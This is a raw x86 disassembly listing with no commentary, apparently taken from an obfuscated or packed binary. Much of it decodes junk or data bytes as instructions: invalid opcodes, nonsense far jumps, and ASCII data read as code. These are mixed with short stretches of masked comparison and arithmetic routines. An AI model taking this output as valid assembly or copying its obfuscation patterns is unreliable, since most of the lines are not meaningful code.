  42e3ea:	cmp    DWORD PTR [ecx+eax*2+0xc34de4a],esp
  42e3f1:	cmp    dh,BYTE PTR [esp+ecx*4]
  42e3f4:	mov    cl,0x55
  42e3f6:	jmp    0xd787:0x131e9e7c
  42e3fd:	enter  0x3acb,0xac
  42e401:	(bad)  
  42e402:	mov    edx,0x953b575
  42e407:	loop   0x42e410
  42e409:	inc    ebp
  42e40a:	fdivr  st,st(1)
  42e40c:	mov    eax,0x344550db
  42e411:	cmp    esp,DWORD PTR [esp+edi*4+0x30]
  42e415:	fnstcw WORD PTR [ebx+0x76d31c5c]
  42e41b:	jl     0x42e3c5
  42e41d:	(bad)  
  42e41e:	jl     0x42e3f9
  42e420:	ret    
  42e421:	dec    esi
  42e422:	xor    DWORD PTR [ebx-0x3d],edx
  42e425:	std    
  42e426:	mov    eax,ds:0xb15f4673
  42e42b:	mov    ?,esp
  42e42d:	mov    bh,0x5a
  42e42f:	jns    0x42e3fc
  42e431:	(bad)  
  42e433:	push   DWORD PTR [ebx]
  42e435:	cli    
  42e436:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e437:	sub    eax,0x6d4295bf
  42e43c:	mov    ch,0xc5
  42e43e:	ss dec esp
  42e440:	pusha  
  42e441:	pop    ebx
  42e442:	aaa    
  42e443:	inc    edi
  42e444:	or     ebp,ebp
  42e446:	sbb    al,0x5a
  42e448:	aas    
  42e449:	ins    BYTE PTR es:[edi],dx
  42e44a:	into   
  42e44b:	fs out dx,eax
  42e44d:	inc    ebp
  42e44e:	aaa    
  42e44f:	inc    ebx
  42e450:	mov    WORD PTR [edx+0x2],ss
  42e453:	retf   
  42e454:	jb     0x42e3f9
  42e456:	inc    esp
  42e457:	dec    ebp
  42e458:	ficomp WORD PTR [edi-0x1e35232c]
  42e45e:	in     eax,dx
  42e45f:	or     eax,0xe31c9dc6
  42e464:	sub    BYTE PTR [edi-0x4cbf39],dh
  42e46a:	(bad)  
  42e46b:	pop    ds
  42e46c:	icebp  
  42e46d:	add    bl,BYTE PTR [eax+edi*1+0x72]
  42e471:	push   ecx
  42e472:	and    ecx,DWORD PTR [ebx-0x1593cb71]
  42e478:	imul   eax,DWORD PTR [esp+ebp*1],0xffffffc7
  42e47c:	lods   al,BYTE PTR ds:[esi]
  42e47d:	and    ebp,ebx
  42e47f:	retf   
  42e480:	sub    eax,0x23b417ff
  42e485:	test   al,0xc6
  42e487:	stos   BYTE PTR es:[edi],al
  42e488:	dec    edx
  42e489:	sub    BYTE PTR [edx-0x5816d06b],ch
  42e48f:	stc    
  42e490:	data16 ds int 0xb7
  42e494:	mov    ebp,0xbc833584
  42e499:	dec    eax
  42e49a:	mov    ds:0xf872504d,eax
  42e49f:	scas   eax,DWORD PTR es:[edi]
  42e4a0:	mov    edx,0x862f53c5
  42e4a5:	mov    DWORD PTR [ebp-0x8],edi
  42e4a8:	mov    edi,DWORD PTR [ebp+0x8]
  42e4ab:	mov    di,WORD PTR [edi+edx*4+0x2]
  42e4b0:	add    di,0x76
  42e4b4:	adc    DWORD PTR ds:0x433660,0xd5c
  42e4be:	jmp    0x42e59b
  42e4c3:	cs retf 
  42e4c5:	mov    al,ds:0xfe7fe57c
  42e4ca:	fcmovnb st,st(4)
  42e4cc:	dec    ecx
  42e4cd:	out    0x33,al
  42e4cf:	dec    ecx
  42e4d0:	repnz push ebx
  42e4d2:	aas    
  42e4d3:	imul   ebp,DWORD PTR [eax],0x2
  42e4d6:	add    al,al
  42e4d8:	add    BYTE PTR [eax],al
  42e4da:	add    BYTE PTR [eax-0x1],bl
  42e4dd:	pop    ss
  42e4de:	add    DWORD PTR [ebp+0x3e17c08c],esp
  42e4e4:	and    al,cl
  42e4e6:	fnsave [ecx+0x1b]
  42e4e9:	cmp    al,0x8c
  42e4eb:	mov    edx,DWORD PTR [edi]
  42e4ed:	add    al,0xe4
  42e4ef:	stos   BYTE PTR es:[edi],al
  42e4f0:	dec    ebp
  42e4f1:	pop    esi
  42e4f2:	xor    eax,0x801eba02
  42e4f7:	daa    
  42e4f8:	dec    esi
  42e4f9:	aad    0xa4
  42e4fb:	jmp    0x8b89df5d
  42e500:	in     al,0x9e
  42e502:	fsub   DWORD PTR [eax]
  42e504:	jg     0x42e514
  42e506:	popf   
  42e507:	fnsave [eax+0x11e7e555]
  42e50d:	jb     0x42e4ba
  42e50f:	dec    ecx
  42e510:	dec    ebx
  42e511:	jmp    0x4653b122
  42e516:	and    al,0xa1
  42e518:	xchg   ecx,eax
  42e519:	pop    eax
  42e51a:	mov    dl,BYTE PTR [ebx]
  42e51c:	fwait
  42e51d:	cli    
  42e51e:	and    DWORD PTR [ebp-0x3e],ebx
  42e521:	xlat   BYTE PTR ds:[ebx]
  42e522:	outs   dx,DWORD PTR ds:[esi]
  42e523:	sub    ecx,DWORD PTR [ebp-0x61]
  42e526:	dec    edi
  42e527:	pop    esp
  42e528:	(bad)  
  42e52a:	enter  0xfbb5,0xbb
  42e52e:	lods   eax,DWORD PTR ds:[esi]
  42e52f:	loopne 0x42e502
  42e531:	test   al,0x6d
  42e533:	dec    ebx
  42e534:	mov    al,ds:0xe89606c9
  42e539:	sbb    DWORD PTR [eax+0x162da2ce],eax
  42e53f:	xchg   esp,eax
  42e540:	mov    ebx,0xe3e22603
  42e545:	in     al,dx
  42e546:	outs   dx,BYTE PTR ds:[esi]
  42e547:	repnz xchg esi,eax
  42e549:	shr    BYTE PTR [edx-0x7460f253],cl
  42e54f:	mov    gs,WORD PTR [ebx-0x76]
  42e552:	xor    dh,0x5b
  42e555:	jnp    0x42e533
  42e557:	xor    eax,0x314c089f
  42e55c:	in     eax,dx
  42e55d:	nop
  42e55e:	jmp    FWORD PTR ds:0x19081f5f
  42e564:	mov    bl,0x0
  42e566:	hlt    
  42e567:	add    ch,bl
  42e569:	ins    DWORD PTR es:[edi],dx
  42e56a:	sub    esi,DWORD PTR [ecx]
  42e56c:	mov    dl,0x84
  42e56e:	jns    0x42e4f9
  42e570:	jo     0x42e560
  42e572:	lds    edi,FWORD PTR [ecx-0x7aaa52a]
  42e578:	inc    ebx
  42e579:	push   edx
  42e57a:	adc    ch,0x7c
  42e57d:	jnp    0x42e55e
  42e57f:	test   DWORD PTR [edx-0x63],0xcc6b63e7
  42e586:	in     al,0xf9
  42e588:	pop    ecx
  42e589:	mov    ebp,0x129f1215
  42e58e:	scas   al,BYTE PTR es:[edi]
  42e58f:	aad    0xaf
  42e591:	xchg   esp,eax
  42e592:	xchg   BYTE PTR [esi+0x7921a851],al
  42e598:	sub    BYTE PTR [edx-0x7],0x66
  42e59c:	imul   edi,ebx
  42e59f:	add    DWORD PTR ds:0x433588,ecx
  42e5a5:	movzx  edi,di
  42e5a8:	sbb    DWORD PTR ds:0x433630,edi
  42e5ae:	or     edi,DWORD PTR [ebp-0x8]
  42e5b1:	jmp    0x42e68e
  42e5b6:	sbb    al,0xc7
  42e5b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e5b9:	(bad)  
  42e5bc:	jle    0x42e59d
  42e5be:	sti    
  42e5bf:	sbb    ecx,DWORD PTR [edi-0x1c]
  42e5c2:	das    
  42e5c3:	in     al,0xc2
  42e5c5:	les    ebp,FWORD PTR [ebx]
  42e5c7:	sub    DWORD PTR [edx],eax
  42e5c9:	add    al,al
  42e5cb:	add    BYTE PTR [eax],al
  42e5cd:	add    BYTE PTR [esi-0x7ca7f6d5],al
  42e5d3:	and    al,0xd2
  42e5d5:	xor    al,0x25
  42e5d7:	pushf  
  42e5d8:	inc    edi
  42e5d9:	push   esi
  42e5da:	in     al,dx
  42e5db:	dec    esp
  42e5dc:	cdq    
  42e5dd:	repnz shr BYTE PTR [ebx-0x35614259],1
  42e5e4:	pop    esi
  42e5e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e5e6:	hlt    
  42e5e7:	fisubr DWORD PTR es:0xeb390928
  42e5ee:	iret   
  42e5ef:	xchg   edx,eax
  42e5f0:	push   0x1eac7818
  42e5f5:	dec    ecx
  42e5f6:	call   0x9698f5a7
  42e5fb:	rcr    ebx,cl
  42e5fd:	push   edx
  42e5fe:	jmp    0x42e61b
  42e600:	sub    edi,0xffffffb6
  42e603:	lahf   
  42e604:	call   0x81f7:0xf263ad02
  42e60b:	repz push 0x1f
  42e60e:	je     0x42e682
  42e610:	sub    DWORD PTR [esi],edi
  42e612:	lahf   
  42e613:	mov    cs,WORD PTR [esi]
  42e615:	cmp    DWORD PTR [ecx-0x4b],0x32
  42e619:	push   0xffffffb2
  42e61b:	dec    esi
  42e61c:	cmp    BYTE PTR [edx],0x56
  42e61f:	repz inc ecx
  42e621:	cld    
  42e622:	mov    ds,WORD PTR [eax+0x13310c9c]
  42e628:	mov    ch,0x30
  42e62a:	xchg   esi,eax
  42e62b:	xor    al,al
  42e62d:	xor    ch,BYTE PTR [esi-0xc]
  42e630:	mov    bl,0x50
  42e632:	repz and edi,ecx
  42e635:	sahf   
  42e636:	jmp    0xc848:0xe4b2b58e
  42e63d:	dec    eax
  42e63e:	sub    BYTE PTR [edi],ch
  42e640:	inc    edi
  42e641:	scas   eax,DWORD PTR es:[edi]
  42e642:	cmc    
  42e643:	inc    edi
  42e644:	aas    
  42e645:	pop    eax
  42e646:	out    dx,al
  42e647:	push   0x78ddb65a
  42e64c:	xchg   ecx,eax
  42e64d:	jg     0x42e5e7
  42e64f:	stos   DWORD PTR es:[edi],eax
  42e650:	pop    esp
  42e651:	fadd   st(1),st
  42e653:	pusha  
  42e654:	fstp   DWORD PTR [ebx+ecx*2+0x59dc9e3]
  42e65b:	xchg   ecx,edx
  42e65d:	xchg   esp,eax
  42e65e:	or     al,0x98
  42e660:	fist   DWORD PTR [ebx+0xd]
  42e663:	mov    edi,0x17f3a44c
  42e668:	jne    0x42e6a9
  42e66a:	and    dl,BYTE PTR [edi+0x1a]
  42e66d:	aam    0x7a
  42e66f:	xchg   edi,eax
  42e670:	popf   
  42e671:	xchg   edx,eax
  42e672:	popa   
  42e673:	mov    ebx,0x6d179797
  42e678:	add    edi,DWORD PTR [edi]
  42e67a:	dec    ebp
  42e67b:	call   0x6c1d6364
  42e680:	add    BYTE PTR [ebp-0xaf2ae4b],dh
  42e686:	jns    0x42e697
  42e688:	test   BYTE PTR [ebx-0x5a],bh
  42e68b:	xchg   ebp,eax
  42e68c:	mov    edx,0xf47d89b2
  42e691:	cmp    DWORD PTR ds:0x4335ec,0x0
  42e698:	jb     0x42e6c4
  42e69e:	dec    ebx
  42e69f:	jmp    0x42e6c4
  42e6a4:	push   DWORD PTR [ebp-0x20]
  42e6a7:	push   0x433584
  42e6ac:	push   0x42eca2
  42e6b1:	push   0x706d
  42e6b6:	push   0x2104
  42e6bb:	push   DWORD PTR [ebp-0x14]
  42e6be:	call   DWORD PTR ds:0x43c810
  42e6c4:	mov    ebx,DWORD PTR [ebp+0x8]
  42e6c7:	jmp    0x42e7a4
  42e6cc:	jmp    0xefbf:0xf9bdb8bb
  42e6d3:	jmp    DWORD PTR [ecx+0x42]
  42e6d6:	inc    ebx
  42e6d7:	pop    edi
  42e6d8:	jne    0x42e706
  42e6da:	lock mov ebx,0x229eb
  42e6e0:	rol    BYTE PTR [eax],0x0
  42e6e3:	add    ah,ah
  42e6e5:	cmp    edx,ebx
  42e6e7:	addr16 or ecx,esi
  42e6ea:	into   
  42e6eb:	loop   0x42e6c3
  42e6ed:	ficomp DWORD PTR [eax-0x1af4e167]
  42e6f3:	cmc    
  42e6f4:	add    ecx,esi
  42e6f6:	packsswb mm0,QWORD PTR [eax-0x2f]
  42e6fa:	push   ds
  42e6fb:	mov    ds:0x7232ef55,al
  42e700:	push   esp
  42e701:	std    
  42e702:	push   edx
  42e703:	add    eax,0xe5b116f1
  42e708:	cdq    
  42e709:	outs   dx,BYTE PTR ds:[esi]
  42e70a:	mov    al,0x55
  42e70c:	inc    esi
  42e70d:	iret   
  42e70e:	cmp    DWORD PTR [eax],ecx
  42e710:	jp     0x42e6eb
  42e712:	call   0x17dc8d9c
  42e717:	in     eax,dx
  42e718:	push   esi
  42e719:	outs   dx,DWORD PTR ds:[esi]
  42e71a:	mov    ecx,0x8a8a5a41
  42e71f:	add    ebx,edx
  42e721:	add    BYTE PTR [ecx],0x9
  42e724:	xor    al,0x13
  42e726:	mov    esp,0x345e9625
  42e72b:	iret   
  42e72c:	neg    bl
  42e72e:	retf   0x159b
  42e731:	jnp    0x42e79c
  42e733:	in     al,0xfb
  42e735:	push   ss
  42e736:	jae    0x42e742
  42e738:	cmp    esi,ebx
  42e73a:	js     0x42e703
  42e73c:	sub    eax,0x53adb6de
  42e741:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e742:	inc    esp
  42e743:	fs xor eax,0xe72a3c8b
  42e749:	sub    BYTE PTR [ebp-0x13de5e21],bl
  42e74f:	pop    ds
  42e750:	cwde   
  42e751:	aaa    
  42e752:	hlt    
  42e753:	sub    BYTE PTR [eax+0x6c80c766],cl
  42e759:	(bad)  [edx]
  42e75b:	add    al,0xc1
  42e75d:	aas    
  42e75e:	lahf   
  42e75f:	or     BYTE PTR [esi],ch
  42e761:	fistp  DWORD PTR ds:0x5dc76733
  42e767:	scas   eax,DWORD PTR es:[edi]
  42e768:	push   eax
  42e769:	and    al,BYTE PTR ds:0x956f8601
  42e76f:	pop    es
  42e770:	out    0x26,al
  42e772:	xchg   ebx,eax
  42e773:	mov    cl,cl
  42e775:	rcl    BYTE PTR [edx],1
  42e777:	movsx  eax,BYTE PTR [esi]
  42e77a:	and    DWORD PTR [eax-0x157b4d03],edi
  42e780:	xor    ah,BYTE PTR [ecx]
  42e782:	cmp    esp,DWORD PTR [eax]
  42e784:	sub    al,0x3d
  42e786:	jmp    0x42e7bd
  42e788:	(bad)  
  42e789:	sub    eax,0x6be93cf5
  42e78e:	push   0x599a0e9a
  42e793:	xchg   esp,eax
  42e794:	out    dx,al
  42e795:	xor    eax,0xfabbd727
  42e79a:	cmp    BYTE PTR [ecx+edi*8],0xbd
  42e79e:	pop    ss
  42e79f:	push   0xf038d34d
  42e7a4:	mov    edi,esi
  42e7a6:	jmp    0x42e883
  42e7ab:	push   cs
  42e7ac:	in     al,0x5b
  42e7ae:	and    edi,ebx
  42e7b0:	mov    edi,0x5c22ed7e
  42e7b5:	popf   
  42e7b6:	imul   ebp,ecx,0xabcdb838
  42e7bc:	sub    al,BYTE PTR [edx]
  42e7be:	add    al,al
  42e7c0:	add    BYTE PTR [eax],al
  42e7c2:	add    BYTE PTR [edx],bh
  42e7c4:	add    al,0x13
  42e7c6:	dec    esp
  42e7c7:	ins    DWORD PTR es:[edi],dx
  42e7c8:	stos   DWORD PTR es:[edi],eax
  42e7c9:	cmp    edx,edi
  42e7cb:	outs   dx,BYTE PTR ds:[esi]
  42e7cc:	(bad)  
  42e7cd:	or     al,0x5e
  42e7cf:	call   0x8466:0x1f078387
  42e7d6:	shl    dh,cl
  42e7d8:	pop    ss
  42e7d9:	and    ebx,DWORD PTR [edx+0x417065ab]
  42e7df:	pop    ebp
  42e7e0:	sub    BYTE PTR [ebx],0x58
  42e7e3:	pop    edi
  42e7e4:	add    BYTE PTR [ebp-0x4d513f99],cl
  42e7ea:	pushf  
  42e7eb:	(bad)  
  42e7ec:	js     0x42e81c
  42e7ee:	bound  esp,QWORD PTR [edi+0x50]
  42e7f1:	mov    eax,ds:0xdee86f25
  42e7f6:	out    0xf4,eax
  42e7f8:	push   ebx
  42e7f9:	mov    cl,0x97
  42e7fb:	push   esp
  42e7fc:	(bad)  
  42e7fd:	movzx  ecx,WORD PTR [ebp+0x2486f930]
  42e804:	(bad)  
  42e805:	stc    
  42e806:	jp     0x42e849
  42e808:	pop    ss
  42e809:	xor    BYTE PTR [eax+0x68],cl
  42e80c:	fadd   DWORD PTR [edi+edx*4+0x5]
  42e810:	cmp    eax,0xaec3883c
  42e815:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e816:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e817:	ret    0x31a9
  42e81a:	jle    0x42e7aa
  42e81c:	test   al,dh
  42e81e:	mov    DWORD PTR [esi],esp
  42e820:	sub    esp,esp
  42e822:	loop   0x42e813
  42e824:	ret    0x5b12
  42e827:	jmp    0x42e863
  42e829:	fisttp DWORD PTR [esi+0x6b2d69a9]
  42e82f:	or     BYTE PTR ds:0xf98e18ae,al
  42e835:	test   eax,0xb9ddc0be
  42e83a:	cs in  al,dx
  42e83c:	and    eax,0x2506a39a
  42e841:	dec    edi
  42e842:	cmp    BYTE PTR [esi-0x5b31a21a],0x87
  42e849:	push   esi
  42e84a:	je     0x42e86f
  42e84c:	sbb    al,0x5b
  42e84e:	cmp    eax,0xbc227981
  42e853:	and    al,0x46
  42e855:	test   ch,0x65
  42e858:	ftst   
  42e85a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e85b:	shl    BYTE PTR [esi],0x4e
  42e85e:	(bad)  
  42e85f:	sti    
  42e860:	dec    esp
  42e861:	push   ss
  42e862:	stos   BYTE PTR es:[edi],al
  42e863:	xor    BYTE PTR [edi],dh
  42e865:	fstp   DWORD PTR [edx-0x6]
  42e868:	scas   eax,DWORD PTR es:[edi]
  42e869:	outs   dx,BYTE PTR ds:[esi]
  42e86a:	jmp    0x42e8d4
  42e86c:	sbb    dh,BYTE PTR [eax+0x4c]
  42e86f:	mov    cl,cl
  42e871:	pop    ds
  42e872:	jg     0x42e8ed
  42e874:	sub    eax,ebx
  42e876:	add    eax,0x3b0b86cc
  42e87b:	addr16 (bad) 
  42e87d:	clc    
  42e87e:	jbe    0x42e8bd
  42e880:	push   0xffffffdc
  42e882:	pop    eax
  42e883:	add    di,WORD PTR [ebx+edx*4]
  42e887:	mov    ebx,DWORD PTR [ebp+0x8]
  42e88a:	movzx  edi,di
  42e88d:	shr    edi,0x8
  42e890:	and    DWORD PTR ds:0x433634,0x433660
  42e89a:	mov    DWORD PTR [ebp-0x8],edi
  42e89d:	mov    edi,esi
  42e89f:	and    DWORD PTR ds:0x433668,0x433664
  42e8a9:	jmp    0x42e986
  42e8ae:	mov    ds:0x5ec25ef3,eax
  42e8b3:	out    dx,eax
  42e8b4:	mov    edi,0xf316fdf3
  42e8b9:	mov    eax,ds:0xc7e84c9b
  42e8be:	imul   ebp,DWORD PTR [ebx],0x2
  42e8c1:	add    al,al
  42e8c3:	add    BYTE PTR [eax],al
  42e8c5:	add    al,cl
  42e8c7:	adc    eax,0x48da16c8
  42e8cc:	test   BYTE PTR [ebp-0x9],cl
  42e8cf:	push   esp
  42e8d0:	(bad)  
  42e8d1:	into   
  42e8d2:	jne    0x42e8c9
  42e8d4:	lahf   
  42e8d5:	push   eax
  42e8d6:	pop    edx
  42e8d7:	call   0x93b34ff
  42e8dc:	repz pop ebp
  42e8de:	xchg   edi,eax
  42e8df:	and    BYTE PTR [ecx+0x4bf4dfe7],bl
  42e8e5:	dec    ebx
  42e8e6:	push   ebp
  42e8e7:	mov    ebp,0x43bcf620
  42e8ec:	test   al,0x14
  42e8ee:	mov    eax,0xf9ae30a2
  42e8f3:	out    0x8,al
  42e8f5:	mov    cl,0x5e
  42e8f7:	cmp    al,0xc9
  42e8f9:	xchg   DWORD PTR [ebx+0x37],eax
  42e8fc:	mov    ecx,0xd12024e2
  42e901:	pop    ecx
  42e902:	mov    eax,0xe243e43c
  42e907:	call   0xa8f78c28
  42e90c:	test   BYTE PTR [ebx],0x25
  42e90f:	cmp    eax,0xde52c7fc
  42e914:	addr16 pop ds
  42e916:	or     BYTE PTR [ebp+0x11],cl
  42e919:	jmp    0x3d4ba87a
  42e91e:	js     0x42e976
  42e920:	pop    es
  42e921:	sbb    edx,ebp
  42e923:	(bad)  
  42e924:	hlt    
  42e925:	add    BYTE PTR [ebx+0x2590db47],ah
  42e92b:	in     eax,0x1a
  42e92d:	scas   al,BYTE PTR es:[edi]
  42e92e:	and    BYTE PTR [eax-0xcb0732e],bl
  42e934:	add    eax,0x9704f07a
  42e939:	enter  0xe8f5,0xf
  42e93d:	pop    es
  42e93e:	sar    bl,cl
  42e940:	adc    eax,0xbd20dc84
  42e945:	aam    0x47
  42e947:	xor    eax,0xe6e213d
  42e94c:	out    dx,eax
  42e94d:	push   es
  42e94e:	xchg   ecx,eax
  42e94f:	out    0x0,al
  42e951:	mov    dh,0x5f
  42e953:	pop    ss
  42e954:	aaa    
  42e955:	pop    ss
  42e956:	cmp    ebp,DWORD PTR [eax-0x36ec4666]
  42e95c:	xchg   edx,eax
  42e95d:	xor    DWORD PTR [esi+0x129bf501],edi
  42e963:	cmp    al,0x1
  42e965:	or     al,0x60
  42e967:	xchg   edi,eax
  42e968:	sub    al,0x27
  42e96a:	fcom   QWORD PTR [edi-0x6894626c]
  42e970:	add    bh,BYTE PTR [edi]
  42e972:	fnclex 
  42e974:	push   ebx
  42e975:	mov    edi,fs
  42e977:	and    ebp,eax
  42e979:	mov    edi,0x42311086
  42e97e:	gs cmp al,0xc1
  42e981:	inc    ebp
  42e982:	jmp    0x3c03:0x6646ddae
  42e989:	xchg   ebx,eax
  42e98a:	movzx  edx,di
  42e98d:	mov    edi,DWORD PTR ds:0x4335a0
  42e993:	sub    DWORD PTR ds:0x433574,edi
  42e999:	jmp    0x42e9c2
  42e99e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e99f:	xchg   DWORD PTR [eax],ebx
  42e9a1:	mov    cl,0x38
  42e9a3:	mov    edi,0xed3897af
  42e9a8:	sahf   
  42e9a9:	mov    edi,0x650bce35
  42e9ae:	sub    ebp,DWORD PTR [edx+eax*1]
  42e9b1:	add    BYTE PTR [eax+eax*1],cl
  42e9b4:	add    BYTE PTR [eax],al
  42e9b6:	sub    eax,0x65b04273
  42e9bb:	fs and eax,0xc8cf44b5
  42e9c1:	bound  ecx,QWORD PTR [ebx-0x1d3e0b83]
  42e9c7:	or     BYTE PTR [ebx],cl
  42e9c9:	push   ebp
  42e9ca:	clc    
  42e9cb:	mov    BYTE PTR [ebp+edi*1-0x48],dl
  42e9cf:	mov    edx,DWORD PTR [ebp-0x18]
  42e9d2:	mov    edi,DWORD PTR [ebp-0x14]
  42e9d5:	xor    edx,ecx
  42e9d7:	lea    eax,[eax+edx*1-0x66479db3]
  42e9de:	mov    edx,DWORD PTR [ebp-0x4]
  42e9e1:	cmp    eax,edx
  42e9e3:	jne    0x42e0ab
  42e9e9:	mov    edi,0x66479db3
  42e9ee:	mov    eax,DWORD PTR [ebp-0x20]
  42e9f1:	mov    edx,DWORD PTR [ebp-0x1c]
  42e9f4:	xor    eax,ecx
  42e9f6:	sub    eax,edi
  42e9f8:	mov    esi,0xacff
  42e9fd:	jmp    0x42ea87
  42ea02:	mov    eax,DWORD PTR [ebp+0x8]
  42ea05:	xor    edx,edx
  42ea07:	add    eax,edi
  42ea09:	adc    edx,0xffff7223
  42ea0f:	xor    eax,ecx
  42ea11:	mov    DWORD PTR [ebp-0x28],eax
  42ea14:	xor    edx,esi
  42ea16:	mov    DWORD PTR [ebp-0x24],edx
  42ea19:	mov    eax,DWORD PTR [ebp-0x18]
  42ea1c:	mov    edx,DWORD PTR [ebp-0x14]
  42ea1f:	mov    edx,DWORD PTR [ebp+0x8]
  42ea22:	mov    dl,BYTE PTR [ebp+edx*1-0x48]
  42ea26:	xor    al,0x60
  42ea28:	add    al,0x4d
  42ea2a:	cmp    dl,al
  42ea2c:	je     0x42ea75
  42ea32:	mov    eax,DWORD PTR [ebp-0x28]
  42ea35:	mov    edx,DWORD PTR [ebp-0x24]
  42ea38:	mov    edx,DWORD PTR [ebp+0x8]
  42ea3b:	mov    dl,BYTE PTR [ebp+edx*1-0x48]
  42ea3f:	mov    ebx,DWORD PTR [ebp+0xc]
  42ea42:	xor    eax,ecx
  42ea44:	cmp    dl,BYTE PTR [ebx+eax*1-0x66479db3]
  42ea4b:	jne    0x42eaa7
  42ea51:	mov    eax,DWORD PTR [ebp-0x28]
  42ea54:	mov    edx,DWORD PTR [ebp-0x24]
  42ea57:	mov    edx,DWORD PTR [ebp-0x20]
  42ea5a:	mov    ebx,DWORD PTR [ebp-0x1c]
  42ea5d:	mov    ebx,DWORD PTR [ebp+0xc]
  42ea60:	xor    dl,0x60
  42ea63:	xor    eax,ecx
  42ea65:	add    dl,0x4d
  42ea68:	cmp    BYTE PTR [ebx+eax*1-0x66479db3],dl
  42ea6f:	je     0x42eab8
  42ea75:	mov    eax,DWORD PTR [ebp-0x18]
  42ea78:	mov    edx,DWORD PTR [ebp-0x14]
  42ea7b:	mov    edx,DWORD PTR [ebp+0x8]
  42ea7e:	xor    eax,ecx
  42ea80:	lea    eax,[eax+edx*1-0x66479db3]
  42ea87:	mov    DWORD PTR [ebp+0x8],eax
  42ea8a:	mov    eax,DWORD PTR [ebp-0x18]
  42ea8d:	mov    edx,DWORD PTR [ebp-0x14]
  42ea90:	xor    edx,esi
  42ea92:	xor    eax,ecx
  42ea94:	add    eax,0x99b8624d
  42ea99:	adc    edx,0x8ddc
  42ea9f:	or     eax,edx
  42eaa1:	jne    0x42ea02
  42eaa7:	mov    eax,DWORD PTR [ebp-0x20]
  42eaaa:	mov    edx,DWORD PTR [ebp-0x1c]
  42eaad:	xor    eax,ecx
  42eaaf:	sub    eax,edi
  42eab1:	pop    edi
  42eab2:	pop    esi
  42eab3:	pop    ebx
  42eab4:	leave  
  42eab5:	ret    0x8
  42eab8:	mov    eax,DWORD PTR [ebp-0x18]
  42eabb:	mov    edx,DWORD PTR [ebp-0x14]
  42eabe:	jmp    0x42eaad
  42eac3:	mov    eax,0xe032f64b
  42eac8:	mov    edx,0xffffdedc
  42eacd:	ret    
  42eace:	sbb    ecx,DWORD PTR ds:0x4335ec
  42ead4:	mov    eax,DWORD PTR [esp+0x8]
  42ead8:	mov    ecx,DWORD PTR ds:0x43366c
  42eade:	adc    DWORD PTR ds:0x433664,ecx
  42eae4:	mov    ecx,DWORD PTR [esp+0x10]
  42eae8:	or     DWORD PTR ds:0x43366c,0x6622
  42eaf2:	or     ecx,eax
  42eaf4:	mov    ecx,0x3c87
  42eaf9:	mov    ecx,DWORD PTR [esp+0xc]
  42eafd:	jne    0x42eb20
  42eb03:	and    DWORD PTR ds:0x43357c,0x6ba6
  42eb0d:	mov    eax,DWORD PTR [esp+0x4]
  42eb11:	and    DWORD PTR ds:0x433600,0x433628
  42eb1b:	mul    ecx
  42eb1d:	ret    0x10
  42eb20:	sub    DWORD PTR ds:0x43361c,0x43364c
  42eb2a:	push   ebx
  42eb2b:	mov    ebx,DWORD PTR ds:0x433568
  42eb31:	adc    DWORD PTR ds:0x433590,ebx
  42eb37:	mul    ecx
  42eb39:	mov    ebx,eax
  42eb3b:	mov    eax,DWORD PTR [esp+0x8]
  42eb3f:	mul    DWORD PTR [esp+0x14]
  42eb43:	add    ebx,eax
  42eb45:	mov    eax,DWORD PTR [esp+0x8]
  42eb49:	mul    ecx
  42eb4b:	add    edx,ebx
  42eb4d:	pop    ebx
  42eb4e:	ret    0x10
  42eb51:	dec    ebx
  42eb52:	push   ecx
  42eb53:	dec    eax
  42eb54:	pop    edi
  42eb55:	ss dec ebx
  42eb57:	aaa    
  42eb58:	xor    al,0x0
  42eb5a:	pop    ecx
  42eb5b:	xor    dh,BYTE PTR [eax]
  42eb5d:	pop    edi
  42eb5e:	xor    al,0x57
  42eb60:	push   ebx
  42eb61:	inc    esi
  42eb62:	add    BYTE PTR [edi+0x38],dl
  42eb65:	dec    ebp
  42eb66:	pop    edi
  42eb67:	xor    dl,BYTE PTR [ebx+0x58]
  42eb6a:	dec    esi
  42eb6b:	dec    edi
  42eb6c:	add    BYTE PTR [ecx+0x4c],cl
  42eb6f:	inc    ebx
  42eb70:	ss pop edi
  42eb72:	dec    ebx
  42eb73:	dec    esi
  42eb74:	dec    esi
  42eb75:	pop    eax
  42eb76:	xor    eax,0x4f345300
  42eb7b:	pop    edi
  42eb7c:	pop    edx
  42eb7d:	push   esi
  42eb7e:	inc    esp
  42eb7f:	xor    DWORD PTR ds:0x56325f34,esi
  42eb85:	add    BYTE PTR [esi+0x34],al
  42eb88:	inc    edx
  42eb89:	pop    edi
  42eb8a:	push   edi
  42eb8b:	xor    eax,0x4f544f
  42eb90:	dec    edi
  42eb91:	pop    ecx
  42eb92:	xor    DWORD PTR [edi+0x5a],ebx
  42eb95:	dec    edx
  42eb96:	inc    esi
  42eb97:	ss pop edi
  42eb99:	inc    ebp
  42eb9a:	dec    eax
  42eb9b:	xor    ecx,DWORD PTR [ebp+0x0]
  42eb9e:	inc    esp
  42eb9f:	inc    edi
  42eba0:	inc    ebx
  42eba1:	pop    edi
  42eba2:	xor    dh,BYTE PTR [eax]
  42eba4:	aaa    
  42eba5:	xor    BYTE PTR [ecx+0x0],al
  42eba8:	inc    esi
  42eba9:	pop    eax
  42ebaa:	push   ecx
  42ebab:	pop    edi
  42ebac:	dec    edx
  42ebad:	inc    ebp
  42ebae:	cmp    DWORD PTR ds:0x31545f,esi
  42ebb4:	pop    ecx
  42ebb5:	push   esi
  42ebb6:	push   edi
  42ebb7:	pop    edi
  42ebb8:	xor    DWORD PTR ss:[eax+0x37],ebx
  42ebbc:	pop    edi
  42ebbd:	push   edi
  42ebbe:	pop    ecx
  42ebbf:	add    BYTE PTR [ecx+edx*2+0x50],dl
  42ebc3:	xor    BYTE PTR [edi+0x34],bl
  42ebc6:	cmp    BYTE PTR [ebp+0x5f],cl
  42ebc9:	inc    edx
  42ebca:	cmp    DWORD PTR [eax+0x33],edx
  42ebcd:	add    BYTE PTR [esi+0x58],cl
  42ebd0:	xor    DWORD PTR [ecx],edi
  42ebd2:	cmp    DWORD PTR [ecx],edi
